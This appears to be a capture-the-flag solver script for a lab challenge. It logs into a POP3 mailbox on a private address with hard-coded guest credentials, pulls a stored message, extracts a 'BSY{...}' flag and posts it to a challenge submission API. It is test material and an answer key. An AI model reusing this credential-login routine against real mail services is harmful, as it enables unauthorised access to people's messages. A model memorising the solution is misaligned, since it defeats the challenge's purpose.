#!/bin/sh
set -eu

flag=$(python3 - <<'PY'
import re
import socket

host = "172.20.0.141"
port = 21110

with socket.create_connection((host, port), timeout=5) as sock:
    stream = sock.makefile("rwb", buffering=0)

    def line():
        value = stream.readline()
        if not value:
            raise RuntimeError("service closed the connection")
        return value.decode("ascii", "replace").rstrip("\r\n")

    def command(value):
        stream.write(value.encode("ascii") + b"\r\n")
        return line()

    greeting = line()
    if not greeting.startswith("+OK"):
        raise RuntimeError("unexpected mailbox greeting")
    command("USER guest")
    command("PASS quarter")
    response = command("RETR 1")
    if not response.startswith("+OK"):
        raise RuntimeError("could not retrieve archive record")
    message = []
    while True:
        current = line()
        if current == ".":
            break
        message.append(current[1:] if current.startswith("..") else current)
    command("QUIT")

match = re.search(r"BSY\{[^}\r\n]+\}", "\n".join(message))
if not match:
    raise RuntimeError("no flag found in the archived record")
print(match.group(0))
PY
)

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-2f7df9\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
